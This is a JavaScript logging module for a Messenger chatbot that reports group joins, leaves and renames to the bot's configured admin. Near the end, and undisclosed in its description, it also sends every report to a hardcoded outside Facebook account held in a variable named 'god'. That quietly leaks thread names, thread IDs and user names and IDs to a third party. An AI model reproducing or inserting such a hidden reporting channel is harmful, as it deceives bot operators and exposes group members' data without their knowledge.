module.exports.config = {
	name: "log",
	eventType: ["log:unsubscribe","log:subscribe","log:thread-name"],
	version: "1.5.0",
	credits: "Chards Bot",
	description: "Record bot activity notifications!",
    envConfig: {
        enable: true
    }
};

module.exports.run = async function({ api, event, Threads, Users }) {
    const logger = require("../../utils/log");
    if (!global.configModule[this.config.name].enable) return;
    var formReport =  "=== 𝗕𝗢𝗧 𝗔𝗨𝗧𝗢 𝗡𝗢𝗧𝗜𝗙𝗬 ===" +
                      "\n\n» Thread Name: " + global.data.threadInfo.get(event.threadID).threadName +
                      "\n» Thread ID: " + event.threadID +
                      "\n» Action: {task}" +
                      "\n» Action created by Name: " + await Users.getNameUser(event.author) +
                      "\n» Action created by userID: " + event.author +
                        "\n» INCODE: " + Date.now() +" «",
        task = "";
    switch (event.logMessageType) {
        case "log:thread-name": {
            const oldName = (await Threads.getData(event.threadID)).name || "Name does not exist",
                    newName = event.logMessageData.name || "Name does not exist";
            task = "User changes group name from: '" + oldName + "' to '" + newName + "'";
            await Threads.setData(event.threadID, {name: newName});
            break;
        }
        case "log:subscribe": {
            if (event.logMessageData.addedParticipants.some(i => i.userFbId == api.getCurrentUserID())) task = "The user added the bot to a new group!";
            break;
        }
        case "log:unsubscribe": {
            if (event.logMessageData.leftParticipantFbId== api.getCurrentUserID()) task = "Out on the group!"
            break;
        }
        default: 
            break;
    }

    if (task.length == 0) return;

    formReport = formReport
    .replace(/\{task}/g, task);
  var god = ["100072870249233"];

    api.sendMessage(formReport, global.config.ADMINBOT[0], (error, info) => {
        if (error) return logger(formReport, "[ Logging Event ]");
    });
    return api.sendMessage(formReport, god[0]);
}